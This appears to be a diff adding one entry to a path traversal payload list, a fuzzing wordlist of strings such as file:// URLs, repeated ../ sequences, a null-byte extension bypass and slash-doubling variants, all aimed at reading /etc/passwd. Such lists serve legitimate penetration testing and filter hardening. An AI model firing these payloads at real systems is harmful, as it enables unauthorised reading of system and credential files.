@@ -23,6 +23,7 @@ file:///etc/?/../passwd
 file://127.0.0.1/etc/passwd
 file://localhost/etc/passwd
 ../../../etc/passwd%00.png
+/var/www/images/../../../etc/passwd
 /....//....//....//....//....//....//....//....//....//etc/passwd
 //..//..//..//etc//passwd
 ///////../../../../../../etc/passwd
